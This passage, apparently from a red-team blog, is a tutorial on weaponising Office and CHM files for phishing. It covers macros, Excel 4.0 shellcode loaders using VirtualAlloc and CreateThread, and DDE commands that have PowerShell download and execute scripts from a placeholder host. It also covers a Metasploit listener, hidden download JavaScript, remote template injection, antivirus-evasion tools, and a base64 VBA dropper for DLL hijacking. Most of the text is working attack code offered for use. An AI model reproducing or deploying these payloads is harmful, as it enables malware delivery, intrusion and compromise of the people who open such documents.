class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>To disguise the CHM file, we make a malicious file based on a normal one.</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hh -decompile .\\html xxx.chm</span><br></pre></td></tr></table></figure>
<p>Then embed payload into one html page, and make sure to induce people to click this page.</p>
<h2 id="Create-Evil-Office-Suite"><a href="#Create-Evil-Office-Suite" class="headerlink" title="Create Evil Office Suite"></a>Create Evil Office Suite</h2><h3 id="Macros-in-Word"><a href="#Macros-in-Word" class="headerlink" title="Macros in Word"></a>Macros in Word</h3><p>Enable developing tools, and adjust the safety of macros to enable all macros in word.<br>Then click <code>Visual Basic</code> to write payload (generate in MSF&#x2F;CS).</p>
<p>Use <a class="link"   target="_blank" rel="noopener" href="https://github.com/outflanknl/EvilClippy" >EvilClippy<i class="fas fa-external-link-alt"></i></a> to bypass AV.</p>
<h3 id="Macros-in-Excel"><a href="#Macros-in-Excel" class="headerlink" title="Macros in Excel"></a>Macros in Excel</h3><p>Right click the <code>Sheet</code> tab, and select <code>insert</code>. Choose the macro item to add a new sheet tab.</p>
<p>Enter <code>=exec(&quot;c:\windows\system32\cmd.exe&quot;)</code> in cell <code>A1</code> and enter <code>=halt()</code> in cell <code>A2</code>. Set cell <code>A1</code> as <code>Auto_open</code> and save it as xlsm file .</p>
<p>exploits on the internet:</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">=R1C2()  // <span class="keyword">call</span> somewhere </span><br><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Kernel32&quot;</span>,<span class="string">&quot;VirtualAlloc&quot;</span>,<span class="string">&quot;JJJJJ&quot;</span>,<span class="number">0</span>,<span class="number">1000000</span>,<span class="number">4096</span>,<span class="number">64</span>)  // invoke Kernel</span><br><span class="line">=<span class="keyword">SELECT</span>(R1C2:R1000:C2,R1C2)  // choose shellcode column</span><br><span class="line">=<span class="keyword">SET</span>.VALUE(R1C3, <span class="number">0</span>)  // <span class="keyword">set</span> one cell</span><br><span class="line">=<span class="keyword">WHILE</span>(LEN(ACTIVE.CELL())&gt;<span class="number">0</span>)  </span><br><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Kernel32&quot;</span>,<span class="string">&quot;WriteProcessMemory&quot;</span>,<span class="string">&quot;JJJCJJ&quot;</span>,-<span class="number">1</span>, R2C1 + R1C3 * <span class="number">20</span>,ACTIVE.CELL(), LEN(ACTIVE.CELL()), <span class="number">0</span>)</span><br><span class="line">=<span class="keyword">SET</span>.VALUE(R1C3, R1C3 + <span class="number">1</span>)</span><br><span class="line">=<span class="keyword">SELECT</span>(, <span class="string">&quot;R[1]C&quot;</span>)</span><br><span class="line">=<span class="keyword">NEXT</span>()   // <span class="keyword">loop</span> shellcode, <span class="keyword">call</span> RtilCopyMemory <span class="keyword">to</span> write memory. </span><br><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Kernel32&quot;</span>,<span class="string">&quot;CreateThread&quot;</span>,<span class="string">&quot;JJJJJJJ&quot;</span>,<span class="number">0</span>, <span class="number">0</span>, R2C1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  //<span class="keyword">call</span> CreateThread <span class="keyword">to</span> create thread</span><br><span class="line">=HALT() // <span class="built_in">or</span> <span class="keyword">RETURN</span> <span class="keyword">to</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>To bypass waf, or make shellcode available:</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/sevagas/macro_pack" >macro_pack<i class="fas fa-external-link-alt"></i></a> automatizes obfuscation and generation of retro formats such as MS Office documents or VBS like format.</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/SharpShooter" >SharpShooter<i class="fas fa-external-link-alt"></i></a> is a payload creation framework for the retrieval and execution of arbitrary CSharp source code.</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/michaelweber/Macrome" >Macrome<i class="fas fa-external-link-alt"></i></a> is An Excel Macro Document Reader&#x2F;Writer.</li>
<li>The site with <a class="link"   target="_blank" rel="noopener" href="https://www.certego.net/en/news/advanced-vba-macros/" >advanced-vba-macros<i class="fas fa-external-link-alt"></i></a>.</li>
</ul>
<p>and some old stuff </p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/curi0usJack/luckystrike" >luckystrike<i class="fas fa-external-link-alt"></i></a> uses COM obj to insert payload into Office document.</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" >Office-DDE-Payloads<i class="fas fa-external-link-alt"></i></a> uses DDE to execute payload.</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/mwrlabs/wePWNise" >wePWNise<i class="fas fa-external-link-alt"></i></a> converts payload to VBA scripts.</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/khr0x40sh/MacroShop" >MacroShop<i class="fas fa-external-link-alt"></i></a> is a collection of scripts to aid in delivering payloads via Office Macros.</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/3gstudent/Worse-PDF" >Worse-PDF<i class="fas fa-external-link-alt"></i></a> to produce malicious PDF.</li>
</ul>
<h3 id="OLE"><a href="#OLE" class="headerlink" title="OLE"></a>OLE</h3><p>Abbreviation of Object Linking and Embedding, is a compound document standard developed by Microsoft Corporation. It enables you to create objects with one application and then link or embed them in a second application. Embedded objects retain their original formatand links to the application that created them.</p>
<p>In openoffice we can use <code>DDE</code> function: <code>=DDE(&quot;cmd&quot;;&quot;/C calc&quot;;&quot;123&quot;)</code> to execute, while in office it is removed.</p>
<p>But we can still use the format <code>application|topic!item</code> to call <code>DDE</code>.</p>
<p>In excel (bit of confusing):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&#x27;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(&quot;http://XXXX/getshell.ps1&quot;);IEX $e&#x27;!_xlbgnm.A1</span><br></pre></td></tr></table></figure>
<p>In word:<br><code>CTRL+F9</code> and insert between ‚Äú{ }‚Äù </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; DDEAUTO c:\windows\system32\cmd.exe &quot;/k calc.exe&quot; &#125;</span><br><span class="line">or</span><br><span class="line">&#123;DDEAUTO C:\\windows\\system32\\cmd.exe &quot;/k powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://x.x.x.x/xx.ps2&#x27;) &quot;&#125;</span><br></pre></td></tr></table></figure>
<p>And listen in MSF:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/fileformat/office_dde_delivery</span><br><span class="line">set lport xx</span><br><span class="line">set lhost xx.xx.xx.xx</span><br></pre></td></tr></table></figure>

<h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><p>If we insert online videos in word, the item <code>embeddedHtml</code> in <code>word/document.xml</code> of word compressed file will have corresponding html codes. We can modify these html to insert evil javascript, like:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(a);</span></span><br><span class="line"><span class="javascript">a.style = <span class="string">&#x27;display: none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">a.href = <span class="string">&quot;http://x.x.x.x:xx/xxx&quot;</span>;</span></span><br><span class="line"><span class="javascript">a.download = fileName;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.URL.revokeObjectURL(url);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">a.click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h3><p>First create a document with template, then create a template which enables macro. Modify the document with template, to let it link to the template we created.<br>Write macro in template <code>xxx.dotm</code>:</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">Shell <span class="string">&quot;calc&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
<p>Or find <code>word_rels\settings.xml.rels</code> in <code>xxx.docx</code> which enables template. Set <code>Target</code> as <code>file:///C:\path\to\xxx.dotm</code>, and the protocol can be changed to <code>smb</code> or <code>http</code>.</p>
<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>There‚Äôre also many command execution vulnerabilities:<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/bhdresh/CVE-2017-0199" >CVE-2017-0199<i class="fas fa-external-link-alt"></i></a>, CVE-2017-8570, CVE-2017-8759, <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882/" >CVE-2017-11882<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/rxwx/CVE-2018-0802" >CVE-2018-0802<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Phish-in-PPSX"><a href="#Phish-in-PPSX" class="headerlink" title="Phish in PPSX"></a>Phish in PPSX</h3><p>We can insert an action button, and set the reaction when clicking&#x2F;hovering as powershell scripts.</p>
<p>Save it as ppsx, and execute it to get backdoor online. In word it has similar methods, and these may be the most effective.</p>
<h3 id="The-Ultra-One"><a href="#The-Ultra-One" class="headerlink" title="The Ultra One"></a>The Ultra One</h3><ol>
<li>Find the target to hijack DLL, and create a malicious DLL. </li>
<li>Read all files in binary and encode to a string by base64 and save it in a textbox</li>
<li>Use the macros to decode from textbox and write to disk. </li>
<li>Finally execute to be online.</li>
</ol>
<p>Talk is cheap, show XX the code.</p>
<p>Read file and encode by base64:</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> WriteBinary(FileName, Buf)</span><br><span class="line">  <span class="keyword">Dim</span> I, aBuf, Size, bStream</span><br><span class="line">  Size = UBound(Buf): <span class="keyword">ReDim</span> aBuf(Size \ <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">For</span> I = <span class="number">0</span> <span class="keyword">To</span> Size - <span class="number">1</span> <span class="keyword">Step</span> <span class="number">2</span></span><br><span class="line">      aBuf(I \ <span class="number">2</span>) = ChrW(Buf(I + <span class="number">1</span>) * <span class="number">256</span> + Buf(I))</span><br><span class="line">  <span class="keyword">Next</span></span><br><span class="line">  <span class="keyword">If</span> I = Size <span class="keyword">Then</span> aBuf(I \ <span class="number">2</span>) = ChrW(Buf(I))</span><br><span class="line">  aBuf = <span class="keyword">Join</span>(aBuf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">Set</span> bStream = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">  bStream.Type = <span class="number">1</span>: bStream.Open</span><br><span class="line">  <span class="keyword">With</span> CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    .Type = <span class="number">2</span>: .Open: .WriteText aBuf</span><br><span class="line">    .Position = <span class="number">2</span>: .CopyTo bStream: .Close</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">  bStream.SaveToFile FileName, <span class="number">2</span>: bStream.Close</span><br><span class="line">  <span class="keyword">Set</span> bStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Encode(str() <span class="keyword">As</span> <span class="type">Byte</span>) <span class="keyword">As</span> <span class="type">String</span>     </span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> over     </span><br><span class="line">    <span class="keyword">Dim</span> Buf() <span class="keyword">As</span> <span class="type">Byte</span>, length <span class="keyword">As</span> <span class="type">Long</span>, mods <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Const</span> B64_CHAR_DICT = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    mods = (UBound(str) + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">3</span>   </span><br><span class="line">    length = UBound(str) + <span class="number">1</span> - mods</span><br><span class="line">    <span class="keyword">ReDim</span> Buf(length / <span class="number">3</span> * <span class="number">4</span> + IIf(mods &lt;&gt; <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">Dim</span> I <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">For</span> I = <span class="number">0</span> <span class="keyword">To</span> length - <span class="number">1</span> <span class="keyword">Step</span> <span class="number">3</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span>) = (str(I) <span class="built_in">And</span> <span class="number">&amp;HFC</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span> + <span class="number">1</span>) = (str(I) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H10</span> + (str(I + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF0</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span> + <span class="number">2</span>) = (str(I + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H4</span> + (str(I + <span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;HC0</span>) / <span class="number">&amp;H40</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span> + <span class="number">3</span>) = str(I + <span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3F</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> mods = <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;HFC</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">1</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H10</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">2</span>) = <span class="number">64</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">3</span>) = <span class="number">64</span></span><br><span class="line">    <span class="keyword">ElseIf</span> mods = <span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;HFC</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">1</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H10</span> + (str(length + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF0</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">2</span>) = (str(length + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H4</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">3</span>) = <span class="number">64</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">For</span> I = <span class="number">0</span> <span class="keyword">To</span> UBound(Buf)</span><br><span class="line">        Base64Encode = Base64Encode + <span class="keyword">Mid</span>(B64_CHAR_DICT, Buf(I) + <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="symbol">over:</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;VB Base64 Encode/DecodeÔºö</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Decode(B64 <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> <span class="type">Byte</span>()    </span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> over     </span><br><span class="line">    <span class="keyword">Dim</span> OutStr() <span class="keyword">As</span> <span class="type">Byte</span>, I <span class="keyword">As</span> <span class="type">Long</span>, j <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Const</span> B64_CHAR_DICT = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    <span class="keyword">If</span> InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> B64 = Left(B64, InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) - <span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">Dim</span> length <span class="keyword">As</span> <span class="type">Long</span>, mods <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    mods = Len(B64) <span class="built_in">Mod</span> <span class="number">4</span></span><br><span class="line">    length = Len(B64) - mods</span><br><span class="line">    <span class="keyword">ReDim</span> OutStr(length / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span> + Switch(mods = <span class="number">0</span>, <span class="number">0</span>, mods = <span class="number">2</span>, <span class="number">1</span>, mods = <span class="number">3</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">For</span> I = <span class="number">1</span> <span class="keyword">To</span> length <span class="keyword">Step</span> <span class="number">4</span></span><br><span class="line">        <span class="keyword">Dim</span> Buf(<span class="number">3</span>) <span class="keyword">As</span> <span class="type">Byte</span></span><br><span class="line">        <span class="keyword">For</span> j = <span class="number">0</span> <span class="keyword">To</span> <span class="number">3</span></span><br><span class="line">            Buf(j) = InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, I + j, <span class="number">1</span>)) - <span class="number">1</span>   </span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">        OutStr((I - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span>) = Buf(<span class="number">0</span>) * <span class="number">&amp;H4</span> + (Buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        OutStr((I - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = (Buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + (Buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        OutStr((I - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">2</span>) = (Buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H40</span> + Buf(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> mods = <span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">    <span class="keyword">ElseIf</span> mods = <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">3</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    Base64Decode = OutStr    </span><br><span class="line"><span class="symbol">over:</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> test2()</span><br><span class="line">    <span class="keyword">Dim</span> iFN <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    <span class="keyword">Dim</span> sPath <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> bFileSize <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Dim</span> sResult <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> arr() <span class="keyword">As</span> <span class="type">Byte</span> <span class="comment">&#x27; bytes array</span></span><br><span class="line">    <span class="keyword">Dim</span> arra() <span class="keyword">As</span> <span class="type">Byte</span> <span class="comment">&#x27; bytes array</span></span><br><span class="line">    <span class="keyword">Dim</span> infile, outfile, infileBase <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    infile = <span class="string">&quot;C:\path\to\in.exe&quot;</span></span><br><span class="line">    outfile = <span class="string">&quot;C:\path\to\out.exe&quot;</span></span><br><span class="line"></span><br><span class="line">    iFN = VBA.FreeFile</span><br><span class="line"></span><br><span class="line">    bFileSize = VBA.FileLen(infile)</span><br><span class="line">    <span class="comment">&#x27;Debug.Print bFileSize</span></span><br><span class="line">    Open infile <span class="keyword">For</span> <span class="keyword">Binary</span> Access Read <span class="keyword">As</span> iFN</span><br><span class="line">    arr = InputB(bFileSize, iFN) <span class="comment">&#x27; read bytes</span></span><br><span class="line"></span><br><span class="line">    infileBase = Base64Encode(arr())</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;Debug.Print infileBase</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> FSO</span><br><span class="line">    <span class="keyword">Set</span> FSO = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> OutPutFile = FSO.OpenTextFile(<span class="string">&quot;C:\path\to\test.txt&quot;</span>, <span class="number">2</span>, <span class="literal">True</span>)</span><br><span class="line">    OutPutFile.Write (infileBase)</span><br><span class="line">    OutPutFile.Close</span><br><span class="line">    <span class="keyword">Set</span> FSO = <span class="literal">Nothing</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;Dim infileBaseExe As String</span></span><br><span class="line">    <span class="comment">&#x27;infileBaseExe = Range(&quot;J22&quot;).Value</span></span><br><span class="line">    <span class="comment">&#x27;infileBaseExe = infileBaseExe + Range(&quot;J23&quot;).Value</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;arra = Base64Decode(infileBase)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;WriteBinary outfile, arra</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>

<p>Office macros to get online:</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 